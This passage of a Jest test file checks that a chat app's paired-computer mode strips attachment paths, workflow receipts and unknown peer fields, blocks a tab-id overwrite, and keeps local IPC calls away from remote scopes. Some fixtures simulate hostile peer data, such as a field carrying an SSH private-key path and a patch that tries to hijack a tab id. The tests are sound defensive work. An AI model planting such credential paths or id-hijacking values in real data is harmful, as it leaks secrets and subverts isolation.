            }),
            projectId: 'proj-toggle',
            worktreeId: 'wt-toggle',
          };
        }
        if (channel === 'approval:pending-requests') {
          if (resolveApprovalRead === null && pendingOnHost.length > 0) {
            return new Promise<ApprovalRequestEvent[]>((resolve) => {
              resolveApprovalRead = resolve;
            });
          }
          return pendingOnHost;
        }
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        return undefined;
      },
    });
    await setOneWindowSwitchForTest(true, toggleFake.api);

    let interestRedeclareCount = 0;
    const removeRedeclare = setChatInterestRedeclareHandler(() => {
      interestRedeclareCount += 1;
    });

    try {
      useChatStore.setState({
        selectedWorktree: {
          projectId: qMac('proj-toggle'),
          worktreeId: qMac('wt-toggle'),
        },
      });
      const loadPromise = useChatStore.getState().loadTabs();
      for (let i = 0; i < 6 && resolveApprovalRead === null; i += 1) {
        await Promise.resolve();
      }
      // A live cancellation arrives while the approval snapshot RPC is in flight.
      toggleFake.emitUpdate(MAC, {
        type: 'push',
        channel: 'approval:cancelled',
        args: [{ requestId: 'req-hydration-race' }],
      });
      const finishApprovalRead = resolveApprovalRead as
        | ((value: ApprovalRequestEvent[]) => void)
        | null;
      if (finishApprovalRead !== null) {
        finishApprovalRead(pendingOnHost);
      }
      pendingOnHost = [];
      await loadPromise;
      for (let i = 0; i < 6; i += 1) {
        await Promise.resolve();
      }
      expect(
        useChatStore.getState().pendingApprovals[qMac('req-hydration-race')],
      ).toBeUndefined();

      // Toggle One Window OFF -> closes holds.
      await setOneWindowSwitchForTest(false, undefined);
      expect(toggleFake.released).toEqual([MAC]);

      // Toggle One Window BACK ON -> redeclares scopes, requests interest, refreshes.
      const scopesBeforeToggleOn = toggleFake.invokes.filter(
        (call) => call.channel === 'chat:set-state-scopes',
      ).length;
      const redeclareBeforeToggleOn = interestRedeclareCount;
      toggleRevision = 2;
      await setOneWindowSwitchForTest(true, toggleFake.api);
      for (let i = 0; i < 12; i += 1) {
        await Promise.resolve();
      }

      expect(
        toggleFake.invokes.filter(
          (call) => call.channel === 'chat:set-state-scopes',
        ).length,
      ).toBeGreaterThan(scopesBeforeToggleOn);
      expect(interestRedeclareCount).toBeGreaterThan(redeclareBeforeToggleOn);
      const toggleKey = qMac('proj-toggle') + '/' + qMac('wt-toggle');
      expect(
        useChatStore
          .getState()
          .worktreeChats[toggleKey]?.tabs[0]?.messages.map((m) => m.id),
      ).toEqual(['m-1', 'm-2']);
    } finally {
      removeRedeclare();
      useChatStore.setState({ selectedWorktree: null });
      useChatStore
        .getState()
        .releaseChatScopeRevisioned(qMac('proj-toggle'), qMac('wt-toggle'));
    }
  });

  it('skips local diff-stat refresh on paired turn diffs, strips queued runtime attachment fields, and blocks id overwrite in tab.metadata_patched', async () => {
    const fastRefreshSpy = jest.fn();
    const prevFastRefresh =
      useProjectsStore.getState().fastRefreshWorktreeDiffStats;
    useProjectsStore.setState({
      fastRefreshWorktreeDiffStats: fastRefreshSpy,
    });

    const hostQueuedRequest = {
      projectId: 'proj-sec',
      worktreeId: 'wt-sec',
      chatId: 'chat-1',
      userMessageId: 'u-queued-1',
      text: 'queued prompt',
      attachmentPaths: ['/Users/remote/secret.png'],
      attachmentPromptContexts: [
        {
          id: 'ctx-1',
          kind: 'file' as const,
          label: 'secret.png',
          path: '/Users/remote/secret.png',
          content: 'TOP SECRET',
        },
      ],
    };

    const secFake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'chat:get-state') {
          const base = makeWireSnapshot({ revision: 1 });
          return {
            ...base,
            projectId: 'proj-sec',
            worktreeId: 'wt-sec',
            runtimeByChatId: {
              'chat-1': {
                status: 'streaming',
                queuedMessageIds: ['q-1'],
                queuedMessages: [
                  {
                    id: 'q-1',
                    request: hostQueuedRequest,
                    origin: 'desktop',
                    enqueuedAtMs: 1_700_000_000_000,
                  },
                ],
              },
            },
          };
        }
        if (channel === 'approval:pending-requests') return [];
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        return undefined;
      },
    });
    await setOneWindowSwitchForTest(true, secFake.api);
    const secInstalledApi = window.api as unknown as Record<string, unknown>;
    const secExistingChatApi =
      (secInstalledApi.chat as Record<string, unknown> | undefined) ?? {};
    const localRevSnap = makeWireSnapshot({
      revision: 1,
      messages: [makeMessage('u-turn-1', 'user', 'Edit src/app.ts')],
    });
    secInstalledApi.approvals = {
      pendingRequests: (): Promise<unknown[]> => Promise.resolve([]),
    };
    secInstalledApi.chat = {
      ...secExistingChatApi,
      onStateChanged: (): (() => void) => (): void => undefined,
      getState: (req: {
        projectId: string;
        worktreeId: string;
      }): Promise<ChatStateSnapshot> => {
        if (
          req.projectId === 'proj-rev-local' &&
          req.worktreeId === 'wt-rev-local'
        ) {
          return Promise.resolve({
            ...localRevSnap,
            projectId: 'proj-rev-local',
            worktreeId: 'wt-rev-local',
          });
        }
        return (
          secExistingChatApi.getState as (arg: unknown) => Promise<never>
        )(req);
      },
    };

    const unsubSecState = chatBackendFor({
      projectId: qMac('proj-sec'),
    }).chat.onStateChanged((event) => {
      useChatStore.getState().handleChatStateChanged(event);
    });

    try {
      const status = await useChatStore
        .getState()
        .hydrateChatScopeRevisioned(qMac('proj-sec'), qMac('wt-sec'));
      expect(status).toBe('installed');

      // 1. Snapshot runtimeByChatId strips queued request attachment fields.
      const snapshotQueued =
        useChatStore.getState().runtimeByChatId[qMac('chat-1')]
          ?.queuedMessages?.[0]?.request;
      expect(snapshotQueued?.text).toBe('queued prompt');
      expect(snapshotQueued?.attachmentPaths).toBeUndefined();
      expect(snapshotQueued?.attachmentPromptContexts).toBeUndefined();

      // 2. Live runtime.patched strips queued request attachment fields too.
      secFake.emitUpdate(MAC, {
        type: 'push',
        channel: 'chat:state-changed',
        args: [
          {
            schemaVersion: 1,
            eventId: 'evt-runtime-queued',
            occurredAt: '2026-11-26T00:55:00Z',
            projectId: 'proj-sec',
            worktreeId: 'wt-sec',
            baseRevision: 1,
            revision: 2,
            changes: [
              {
                type: 'runtime.patched',
                chatId: 'chat-1',
                runtime: {
                  status: 'streaming',
                  queuedMessageIds: ['q-2'],
                  queuedMessages: [
                    {
                      id: 'q-2',
                      request: {
                        ...hostQueuedRequest,
                        userMessageId: 'u-queued-2',
                        text: 'live queued prompt',
                      },
                      origin: 'desktop',
                      enqueuedAtMs: 1_700_000_000_100,
                    },
                  ],
                },
              },
            ],
          },
        ],
      });
      const liveQueued =
        useChatStore.getState().runtimeByChatId[qMac('chat-1')]
          ?.queuedMessages?.[0]?.request;
      expect(liveQueued?.text).toBe('live queued prompt');
      expect(liveQueued?.attachmentPaths).toBeUndefined();
      expect(liveQueued?.attachmentPromptContexts).toBeUndefined();

      // 3. Live tab.metadata_patched cannot overwrite the tab's qualified id.
      secFake.emitUpdate(MAC, {
        type: 'push',
        channel: 'chat:state-changed',
        args: [
          {
            schemaVersion: 1,
            eventId: 'evt-id-hijack',
            occurredAt: '2026-11-26T00:55:01Z',
            projectId: 'proj-sec',
            worktreeId: 'wt-sec',
            baseRevision: 2,
            revision: 3,
            changes: [
              {
                type: 'tab.metadata_patched',
                tabId: 'chat-1',
                patch: {
                  id: 'local-unrelated-tab',
                  title: 'Safe Rename',
                },
              },
            ],
          },
        ],
      });
      const secKey = qMac('proj-sec') + '/' + qMac('wt-sec');
      const patchedTab = useChatStore.getState().worktreeChats[secKey]?.tabs[0];
      expect(patchedTab?.id).toBe(qMac('chat-1'));
      expect(patchedTab?.title).toBe('Safe Rename');

      // 4. Paired turn_diff events never trigger local fastRefreshWorktreeDiffStats
      //    (both revisioned and loaded non-revisioned branches), while local scopes do.
      const turnDiffPayload = {
        type: 'turn_diff' as const,
        userMessageId: 'u-turn-1',
        files: [
          {
            path: 'src/app.ts',
            insertions: 3,
            deletions: 1,
            status: 'modified' as const,
          },
        ],
        totalInsertions: 3,
        totalDeletions: 1,
        capturedAt: 1_700_000_000_500,
      };
      expect(isTurnDiffEventData(turnDiffPayload)).toBe(true);

      // Seed loaded non-revisioned paired and local scopes so the non-revisioned
      // turn_diff branch reaches applyTurnDiffEventToWorktree and its refresh guard.
      const nonRevPairedKey = qMac('proj-nonrev') + '/' + qMac('wt-nonrev');
      const nonRevLocalKey = 'proj-nonrev-local/wt-nonrev-local';
      if (!patchedTab) throw new Error('expected hydrated patchedTab');
      const makeLoadedNonRev = (
        chatId: string,
      ): { tabs: (typeof patchedTab)[]; activeTabId: string } => ({
        tabs: [
          {
            ...patchedTab,
            id: chatId,
            title: 'Turn diff tab',
            messages: [
              {
                id: 'u-turn-1',
                role: 'user' as const,
                blocks: [{ type: 'text' as const, text: 'Edit src/app.ts' }],
                timestamp: 1_700_000_000_000,
              },
            ],
            queuedMessages: [],
            status: 'idle' as const,
          },
        ],
        activeTabId: chatId,
      });
      useChatStore.setState((state) => ({
        worktreeChats: {
          ...state.worktreeChats,
          [nonRevPairedKey]: makeLoadedNonRev(qMac('chat-nonrev')),
          [nonRevLocalKey]: makeLoadedNonRev('chat-nonrev-local'),
        },
      }));

      // Revisioned paired scope
      useChatStore.getState().handleChatEvent({
        projectId: qMac('proj-sec'),
        worktreeId: qMac('wt-sec'),
        chatId: qMac('chat-1'),
        data: turnDiffPayload,
      });
      // Non-revisioned loaded paired scope
      useChatStore.getState().handleChatEvent({
        projectId: qMac('proj-nonrev'),
        worktreeId: qMac('wt-nonrev'),
        chatId: qMac('chat-nonrev'),
        data: turnDiffPayload,
      });
      expect(fastRefreshSpy).not.toHaveBeenCalled();

      // Local-scope positive controls prove BOTH branches invoke fastRefreshSpy when not paired.
      const localRevStatus = await useChatStore
        .getState()
        .hydrateChatScopeRevisioned('proj-rev-local', 'wt-rev-local');
      expect(localRevStatus).toBe('installed');

      // Local revisioned positive control
      useChatStore.getState().handleChatEvent({
        projectId: 'proj-rev-local',
        worktreeId: 'wt-rev-local',
        chatId: 'chat-1',
        data: turnDiffPayload,
      });
      expect(fastRefreshSpy).toHaveBeenCalledWith(
        'proj-rev-local',
        'wt-rev-local',
      );

      // Local non-revisioned positive control
      fastRefreshSpy.mockClear();
      useChatStore.getState().handleChatEvent({
        projectId: 'proj-nonrev-local',
        worktreeId: 'wt-nonrev-local',
        chatId: 'chat-nonrev-local',
        data: turnDiffPayload,
      });
      expect(fastRefreshSpy).toHaveBeenCalledWith(
        'proj-nonrev-local',
        'wt-nonrev-local',
      );
    } finally {
      unsubSecState();
      useProjectsStore.setState({
        fastRefreshWorktreeDiffStats: prevFastRefresh,
      });
      useChatStore
        .getState()
        .releaseChatScopeRevisioned(qMac('proj-sec'), qMac('wt-sec'));
      useChatStore
        .getState()
        .releaseChatScopeRevisioned('proj-rev-local', 'wt-rev-local');
      useChatStore.setState((state) => {
        const next = { ...state.worktreeChats };
        delete next[qMac('proj-nonrev') + '/' + qMac('wt-nonrev')];
        delete next['proj-nonrev-local/wt-nonrev-local'];
        return { worktreeChats: next };
      });
    }
  });

  it('sanitizes latestHumanMessage on transcript pages, strips paired workflow receipts across transcript and live events, blocks local workflow/tray/cache IPC, and skips local plan detection on paired loadTabs (with local-scope positive controls)', async () => {
    const scanDetectedPlansSpy = jest.fn(() => Promise.resolve([]));
    const prevScanDetectedPlans = useActivityStore.getState().scanDetectedPlans;
    useActivityStore.setState({ scanDetectedPlans: scanDetectedPlansSpy });

    const readWorkflowRunSpy = jest.fn(() => Promise.resolve(null));
    const startOutputPollingSpy = jest.fn(() => Promise.resolve());
    const stopOutputPollingSpy = jest.fn(() => Promise.resolve());
    const readFullOutputSpy = jest.fn(() =>
      Promise.resolve({ content: '', truncated: false }),
    );
    const prevApi = window.api;

    const receiptOutput = [
      'Workflow launched in background.',
      'Run ID: wf_secret_123',
      'Transcript dir: /Users/remote/.canopy/workflows/wf_secret_123',
      'Script file: /Users/remote/app/workflow.ts',
      'Summary: Audit',
    ].join('\n');

    const latestHumanWithPaths: PersistedChatMessage = {
      id: 'human-outside-window',
      role: 'user',
      blocks: [
        { type: 'text', text: 'Look at this screenshot' },
        {
          type: 'image',
          path: '/Users/remote/Desktop/secret.png',
          alt: 'secret.png',
          dataUrl: 'data:image/png;base64,iVBORw0KGgo=',
        },
      ],
      attachmentPaths: ['/Users/remote/Desktop/secret.png'],
      attachmentPromptContexts: [
        {
          attachmentPath: '/Users/remote/Desktop/secret.png',
          promptKind: 'linear-ticket',
        },
      ],
      timestamp: 1_700_000_000_000,
    };

    const makeIsolationSnapshot = (
      projectId: string,
      worktreeId: string,
    ): ChatStateSnapshot => {
      const snap = makeWireSnapshot({
        revision: 1,
        messages: [
          {
            id: 'm-user-prompt',
            role: 'user',
            blocks: [{ type: 'text', text: 'Write the plan and run Audit.' }],
            timestamp: 1_700_000_000_050,
          },
          {
            id: 'm-plan-wf',
            role: 'assistant',
            blocks: [
              {
                type: 'text',
                text: 'Wrote plan to /Users/remote/repo/docs/plan.md',
              },
              {
                type: 'tool_result',
                toolUseId: 'tu-wf-1',
                toolName: 'Bash',
                isError: false,
                output: receiptOutput,
              },
            ],
            timestamp: 1_700_000_000_100,
          },
        ],
      });
      const firstTab = snap.tabsFile.tabs[0];
      if (firstTab) {
        snap.tabsFile.tabs[0] = {
          ...firstTab,
          transcriptWindow: {
            totalMessages: 50,
            transcriptRevision: 1,
            latestHumanMessage: latestHumanWithPaths,
          },
        };
      }
      return {
        ...snap,
        projectId,
        worktreeId,
      };
    };

    const isoFake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'chat:get-state') {
          return makeIsolationSnapshot('proj-iso', 'wt-iso');
        }
        if (channel === 'chat:get-transcript-page') {
          return {
            messages: [makeMessage('m-page-1', 'assistant', 'Page reply')],
            totalMessages: 50,
            transcriptRevision: 1,
            latestHumanMessage: latestHumanWithPaths,
          };
        }
        if (channel === 'approval:pending-requests') return [];
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        return undefined;
      },
    });
    await setOneWindowSwitchForTest(true, isoFake.api);

    // Install activity, approval, and local-control chat.getState hooks AFTER
    // setOneWindowSwitchForTest replaces window.api so spies stay attached.
    const installedApi = window.api as unknown as Record<string, unknown>;
    const existingChatApi =
      (installedApi.chat as Record<string, unknown> | undefined) ?? {};
    const localControlSnapshot = makeIsolationSnapshot(
      'proj-local-ctrl',
      'wt-local-ctrl',
    );
    installedApi.activity = {
      readWorkflowRun: readWorkflowRunSpy,
      startOutputPolling: startOutputPollingSpy,
      stopOutputPolling: stopOutputPollingSpy,
      readFullOutput: readFullOutputSpy,
      onBgProcessOutput: (): (() => void) => (): void => undefined,
      getLiveBgTasks: (): Promise<null> => Promise.resolve(null),
    };
    installedApi.discoverWorktreeEnv = (): Promise<undefined> =>
      Promise.resolve(undefined);
    installedApi.approvals = {
      pendingRequests: (): Promise<unknown[]> => Promise.resolve([]),
    };
    installedApi.managedDelegation = {
      tree: (): Promise<{ ok: true; entries: unknown[] }> =>
        Promise.resolve({ ok: true, entries: [] }),
      roots: (): Promise<unknown[]> => Promise.resolve([]),
    };
    installedApi.chat = {
      ...existingChatApi,
      onStateChanged: (): (() => void) => (): void => undefined,
      getState: (req: {
        projectId: string;
        worktreeId: string;
      }): Promise<ChatStateSnapshot> => {
        if (
          req.projectId === 'proj-local-ctrl' &&
          req.worktreeId === 'wt-local-ctrl'
        ) {
          return Promise.resolve(localControlSnapshot);
        }
        return (existingChatApi.getState as (arg: unknown) => Promise<never>)(
          req,
        );
      },
    };

    const container = document.createElement('div');
    document.body.appendChild(container);
    const root: Root = createRoot(container);
    const unsubPairedEvents = chatBackendFor({
      projectId: qMac('proj-iso'),
    }).chat.onChatEvent((event) => {
      useChatStore.getState().handleChatEvent(event);
    });
    let releasePairedSubagentTree: (() => void) | undefined;
    let releaseLocalSubagentTree: (() => void) | undefined;

    try {
      // 1. Paired loadTabs skips post-hydration local plan detection scan;
      //    local control with the exact same fixture DOES invoke scanDetectedPlans.
      await useChatStore
        .getState()
        .loadTabsForTarget(qMac('proj-iso'), qMac('wt-iso'));
      expect(scanDetectedPlansSpy).not.toHaveBeenCalled();

      await useChatStore
        .getState()
        .loadTabsForTarget('proj-local-ctrl', 'wt-local-ctrl');
      expect(scanDetectedPlansSpy).toHaveBeenCalledWith(
        'proj-local-ctrl',
        'wt-local-ctrl',
        'chat-1',
        expect.arrayContaining(['/Users/remote/repo/docs/plan.md']),
      );

      // 2. Paired tool_result strips workflow launch receipt text and transcriptWindow.latestHumanMessage strips paths.
      const isoKey = qMac('proj-iso') + '/' + qMac('wt-iso');
      const isoTab = useChatStore.getState().worktreeChats[isoKey]?.tabs[0];
      const toolResultBlock = isoTab?.messages[1]?.blocks.find(
        (block) => block.type === 'tool_result',
      );
      expect(
        toolResultBlock?.type === 'tool_result' ? toolResultBlock.output : '',
      ).not.toContain('wf_secret_123');
      expect(
        toolResultBlock?.type === 'tool_result' ? toolResultBlock.output : '',
      ).not.toContain('/Users/remote');
      const windowLatest = isoTab?.transcriptWindow?.latestHumanMessage;
      expect(windowLatest?.attachmentPaths).toBeUndefined();
      expect(windowLatest?.attachmentPromptContexts).toBeUndefined();
      const windowImg = windowLatest?.blocks.find((b) => b.type === 'image');
      expect(windowImg?.type === 'image' ? windowImg.path : 'wrong').toBe('');

      // 3. getTranscriptPage sanitizes page.latestHumanMessage attachment and image paths.
      const page = await chatBackendFor({
        projectId: qMac('proj-iso'),
      }).chat.getTranscriptPage({
        projectId: qMac('proj-iso'),
        worktreeId: qMac('wt-iso'),
        chatId: qMac('chat-1'),
      });
      expect(page.latestHumanMessage?.attachmentPaths).toBeUndefined();
      expect(page.latestHumanMessage?.attachmentPromptContexts).toBeUndefined();
      const pageImg = page.latestHumanMessage?.blocks.find(
        (b) => b.type === 'image',
      );
      expect(pageImg?.type === 'image' ? pageImg.path : 'wrong').toBe('');

      // 4. Live paired chat:event tool_result carrying workflow receipt text
      //    never records a peer transcriptDir in activityStore or triggers local IPC.
      isoFake.emitUpdate(MAC, {
        type: 'push',
        channel: 'chat:event',
        args: [
          {
            projectId: 'proj-iso',
            worktreeId: 'wt-iso',
            chatId: 'chat-1',
            type: 'message',
            data: {
              type: 'assistant',
              message: {
                content: [
                  {
                    type: 'tool_use',
                    id: 'tu-live-wf',
                    name: 'Bash',
                    input: {
                      command: 'node workflow.ts',
                      run_in_background: true,
                    },
                  },
                ],
              },
            },
          },
        ],
      });
      isoFake.emitUpdate(MAC, {
        type: 'push',
        channel: 'chat:event',
        args: [
          {
            projectId: 'proj-iso',
            worktreeId: 'wt-iso',
            chatId: 'chat-1',
            type: 'message',
            data: {
              type: 'user',
              message: {
                content: [
                  {
                    type: 'tool_result',
                    tool_use_id: 'tu-live-wf',
                    content: [
                      {
                        type: 'text',
                        text: receiptOutput,
                      },
                    ],
                    is_error: false,
                  },
                ],
              },
            },
          },
        ],
      });
      // Codex live command_execution completion with workflow launch receipt
      isoFake.emitUpdate(MAC, {
        type: 'push',
        channel: 'chat:event',
        args: [
          {
            projectId: 'proj-iso',
            worktreeId: 'wt-iso',
            chatId: 'chat-1',
            type: 'message',
            data: {
              type: 'codex',
              event: {
                type: 'item.started',
                item: {
                  id: 'cx-wf-1',
                  type: 'command_execution',
                  command: 'node workflow.ts',
                },
              },
            },
          },
        ],
      });
      isoFake.emitUpdate(MAC, {
        type: 'push',
        channel: 'chat:event',
        args: [
          {
            projectId: 'proj-iso',
            worktreeId: 'wt-iso',
            chatId: 'chat-1',
            type: 'message',
            data: {
              type: 'codex',
              event: {
                type: 'item.completed',
                item: {
                  id: 'cx-wf-1',
                  type: 'command_execution',
                  status: 'completed',
                  aggregated_output: receiptOutput,
                },
              },
            },
          },
        ],
      });

      const pairedBgProcesses =
        useActivityStore.getState().bgProcesses[isoKey] ?? [];
      for (const proc of pairedBgProcesses) {
        expect(proc.transcriptDir).toBeUndefined();
        expect(proc.runId).toBeUndefined();
      }
      expect(readWorkflowRunSpy).not.toHaveBeenCalled();
      expect(startOutputPollingSpy).not.toHaveBeenCalled();

      // Positive local control: the same unsanitized live tool_result DOES populate
      // transcriptDir and runId in activityStore for a local scope.
      useChatStore.getState().handleChatEvent({
        projectId: 'proj-local-ctrl',
        worktreeId: 'wt-local-ctrl',
        chatId: 'chat-1',
        data: {
          type: 'assistant',
          message: {
            content: [
              {
                type: 'tool_use',
                id: 'tu-local-wf',
                name: 'Bash',
                input: {
                  command: 'node workflow.ts',
                  run_in_background: true,
                },
              },
            ],
          },
        },
      });
      useChatStore.getState().handleChatEvent({
        projectId: 'proj-local-ctrl',
        worktreeId: 'wt-local-ctrl',
        chatId: 'chat-1',
        data: {
          type: 'user',
          message: {
            content: [
              {
                type: 'tool_result',
                tool_use_id: 'tu-local-wf',
                content: [{ type: 'text', text: receiptOutput }],
                is_error: false,
              },
            ],
          },
        },
      });
      const localBgProcesses =
        useActivityStore.getState().bgProcesses[
          'proj-local-ctrl/wt-local-ctrl'
        ] ?? [];
      expect(
        localBgProcesses.some(
          (proc) =>
            proc.runId === 'wf_secret_123' &&
            proc.transcriptDir ===
              '/Users/remote/.canopy/workflows/wf_secret_123',
        ),
      ).toBe(true);

      // 5. WorkflowBlock inside a paired scope never calls local readWorkflowRun IPC;
      //    inside a local scope with the exact same props it DOES call readWorkflowRunSpy.
      readWorkflowRunSpy.mockClear();
      await act(async () => {
        root.render(
          createElement(
            ChatMarkdownFileTargetContext.Provider,
            {
              value: {
                projectId: qMac('proj-iso'),
                worktreeId: qMac('wt-iso'),
              },
            },
            createElement(WorkflowBlock, {
              toolUseId: 'tu-wf-1',
              workflowName: 'Audit',
              summary: 'Audit',
              runId: 'wf_secret_123',
              transcriptDir: '/Users/remote/.canopy/workflows/wf_secret_123',
            }),
          ),
        );
        await Promise.resolve();
      });
      expect(readWorkflowRunSpy).not.toHaveBeenCalled();

      await act(async () => {
        root.render(
          createElement(
            ChatMarkdownFileTargetContext.Provider,
            {
              value: {
                projectId: 'proj-local-ctrl',
                worktreeId: 'wt-local-ctrl',
              },
            },
            createElement(WorkflowBlock, {
              toolUseId: 'tu-wf-1',
              workflowName: 'Audit',
              summary: 'Audit',
              runId: 'wf_secret_123',
              transcriptDir: '/Users/remote/.canopy/workflows/wf_secret_123',
            }),
          ),
        );
        await Promise.resolve();
      });
      expect(readWorkflowRunSpy).toHaveBeenCalledWith({
        transcriptDir: '/Users/remote/.canopy/workflows/wf_secret_123',
        runId: 'wf_secret_123',
      });

      // 6. Tray inspector useBackgroundTaskActions blocks local readWorkflowRun/readFullOutput
      //    for paired scopes even if a synthetic process carries transcriptDir; local scope calls it.
      readWorkflowRunSpy.mockClear();
      const syntheticBgProcess: BackgroundProcess = {
        id: 'bg-wf-1',
        toolUseId: 'tu-live-wf',
        taskId: 'task-wf-1',
        chatId: qMac('chat-1'),
        toolName: 'Bash',
        kind: 'workflow',
        description: 'Audit',
        status: 'running',
        startedAt: 1_700_000_000_000,
        updatedAt: 1_700_000_000_100,
        outputLines: [],
        canStop: false,
        runId: 'wf_secret_123',
        transcriptDir: '/Users/remote/.canopy/workflows/wf_secret_123',
        outputFile: '/Users/remote/.canopy/tmp/bg.log',
      };
      const syntheticTask: BackgroundTask = {
        id: 'bg-wf-1',
        kind: 'workflow',
        status: 'running',
        title: 'Audit',
        ownerToolUseId: 'tu-live-wf',
        parentTaskId: null,
        startedAt: 1_700_000_000_000,
        settledAt: null,
        updatedAt: 1_700_000_000_100,
        lastDescription: null,
        summary: null,
        outputLines: [],
        canStop: false,
      };
      let capturedActions: BackgroundTaskHostActions | undefined;
      function ActionsProbe(props: {
        projectId: string;
        worktreeId: string;
      }): null {
        capturedActions = useBackgroundTaskActions({
          projectId: props.projectId,
          worktreeId: props.worktreeId,
          processes: [syntheticBgProcess],
        });
        return null;
      }

      await act(async () => {
        root.render(
          createElement(ActionsProbe, {
            projectId: qMac('proj-iso'),
            worktreeId: qMac('wt-iso'),
          }),
        );
        await Promise.resolve();
      });
      expect(capturedActions?.subscribeWorkflowProgress).toBeUndefined();
      expect(capturedActions?.renderWorkflowRun).toBeUndefined();
      expect(capturedActions?.readFullOutput).toBeUndefined();
      expect(capturedActions?.subscribeOutput).toBeUndefined();
      expect(capturedActions?.stopTarget).toBeUndefined();
      expect(
        capturedActions?.getDetail?.(syntheticTask)?.outputSource,
      ).toBeUndefined();
      expect(readWorkflowRunSpy).not.toHaveBeenCalled();

      await act(async () => {
        root.render(
          createElement(ActionsProbe, {
            projectId: 'proj-local-ctrl',
            worktreeId: 'wt-local-ctrl',
          }),
        );
        await Promise.resolve();
      });
      const unsubLocalProgress = capturedActions?.subscribeWorkflowProgress?.(
        syntheticTask,
        () => undefined,
      );
      await Promise.resolve();
      unsubLocalProgress?.();
      expect(readWorkflowRunSpy).toHaveBeenCalledWith({
        transcriptDir: '/Users/remote/.canopy/workflows/wf_secret_123',
        runId: 'wf_secret_123',
      });

      // 7. Subagent workflow cache (subagent-tree-store) blocks local readWorkflowRun
      //    for paired scopes even if passed a raw receipt message; local scope calls it.
      resetWorkflowRunCacheForTests();
      resetSubagentTreeStoreForTests();
      readWorkflowRunSpy.mockClear();
      const rawReceiptMessages = [
        {
          id: 'm-raw-wf',
          role: 'assistant' as const,
          blocks: [
            {
              type: 'tool_use' as const,
              toolUseId: 'tu-cache-wf',
              toolName: 'Workflow',
              input: JSON.stringify({
                script: '/Users/remote/app/workflow.ts',
              }),
            },
            {
              type: 'tool_result' as const,
              toolUseId: 'tu-cache-wf',
              toolName: 'Workflow',
              isError: false,
              output: receiptOutput,
            },
          ],
          timestamp: 1_700_000_000_200,
        },
      ];
      releasePairedSubagentTree = acquireSubagentTree(
        { projectId: qMac('proj-iso'), worktreeId: qMac('wt-iso') },
        qMac('chat-1'),
      );
      updateSubagentTreeRootChat(
        { projectId: qMac('proj-iso'), worktreeId: qMac('wt-iso') },
        qMac('chat-1'),
        {
          hydrated: true,
          rootChatOpen: true,
          title: 'Paired chat',
          messages: rawReceiptMessages,
          agentUsage: undefined,
        },
      );
      await Promise.resolve();
      expect(readWorkflowRunSpy).not.toHaveBeenCalled();

      releaseLocalSubagentTree = acquireSubagentTree(
        { projectId: 'proj-local-ctrl', worktreeId: 'wt-local-ctrl' },
        'chat-1',
      );
      updateSubagentTreeRootChat(
        { projectId: 'proj-local-ctrl', worktreeId: 'wt-local-ctrl' },
        'chat-1',
        {
          hydrated: true,
          rootChatOpen: true,
          title: 'Local chat',
          messages: rawReceiptMessages,
          agentUsage: undefined,
        },
      );
      await Promise.resolve();
      expect(readWorkflowRunSpy).toHaveBeenCalledWith({
        transcriptDir: '/Users/remote/.canopy/workflows/wf_secret_123',
        runId: 'wf_secret_123',
      });
    } finally {
      releasePairedSubagentTree?.();
      releaseLocalSubagentTree?.();
      resetWorkflowRunCacheForTests();
      resetSubagentTreeStoreForTests();
      unsubPairedEvents();
      act(() => {
        root.unmount();
      });
      container.remove();
      (window as { api: unknown }).api = prevApi;
      useActivityStore.setState({ scanDetectedPlans: prevScanDetectedPlans });
      useChatStore
        .getState()
        .releaseChatScopeRevisioned(qMac('proj-iso'), qMac('wt-iso'));
      useChatStore
        .getState()
        .releaseChatScopeRevisioned('proj-local-ctrl', 'wt-local-ctrl');
    }
  });

  it('allowlists paired tab and event fields (dropping turnDiffs and unknown keys), blocks paired IDs at the local IPC choke point, and guards TurnDiffPopover, useFileDiffSnapshot, and TurnDiffSummary (with local-scope positive controls)', async () => {
    const getTurnFileDiffSpy = jest.fn(() =>
      Promise.resolve({
        oldValue: 'old',
        newValue: 'new',
        truncated: false,
        binary: false,
      }),
    );
    const getWorktreePathSpy = jest.fn(() => Promise.resolve('/local/repo'));
    const prevApi = window.api;
    const prevSelectedWorktree = useChatStore.getState().selectedWorktree;

    const sampleTurnDiff = {
      files: [
        {
          path: 'src/secret.ts',
          status: 'modified' as const,
          insertions: 4,
          deletions: 1,
        },
      ],
      totalInsertions: 4,
      totalDeletions: 1,
      capturedAt: 1_700_000_000_900,
      treeRefs: [{ startTree: 'tree-aaa', endTree: 'tree-bbb' }],
    };

    const allowFake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'chat:get-state') {
          const snap = makeWireSnapshot({
            revision: 1,
            messages: [
              makeMessage('u-td-1', 'user', 'Check diff'),
              makeMessage('a-td-1', 'assistant', 'Done'),
            ],
          });
          const firstTab = snap.tabsFile.tabs[0];
          if (firstTab) {
            snap.tabsFile.tabs[0] = {
              ...firstTab,
              turnDiffs: { 'u-td-1': sampleTurnDiff },
              filePath: '/Users/remote/secret.txt',
              ...({
                unknownPeerHostField: '/Users/remote/.ssh/id_rsa',
              } as Record<string, unknown>),
            };
          }
          return {
            ...snap,
            projectId: 'proj-al',
            worktreeId: 'wt-al',
          };
        }
        if (channel === 'approval:pending-requests') return [];
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        return undefined;
      },
    });
    await setOneWindowSwitchForTest(true, allowFake.api);

    const installedApi = window.api as unknown as Record<string, unknown>;
    installedApi.getWorktreePath = getWorktreePathSpy;
    installedApi.activity = {
      getTurnFileDiff: getTurnFileDiffSpy,
      getFileDiff: getTurnFileDiffSpy,
      readWorkflowRun: (): Promise<null> => Promise.resolve(null),
      startOutputPolling: (): Promise<void> => Promise.resolve(),
      stopOutputPolling: (): Promise<void> => Promise.resolve(),
      readFullOutput: (): Promise<{ content: string; truncated: boolean }> =>
        Promise.resolve({ content: '', truncated: false }),
      onBgProcessOutput: (): (() => void) => (): void => undefined,
      getLiveBgTasks: (): Promise<null> => Promise.resolve(null),
    };

    const receivedEvents: ChatEvent[] = [];
    const unsubEvents = chatBackendFor({
      projectId: qMac('proj-al'),
    }).chat.onChatEvent((event) => {
      receivedEvents.push(event);
    });

    const container = document.createElement('div');
    document.body.appendChild(container);
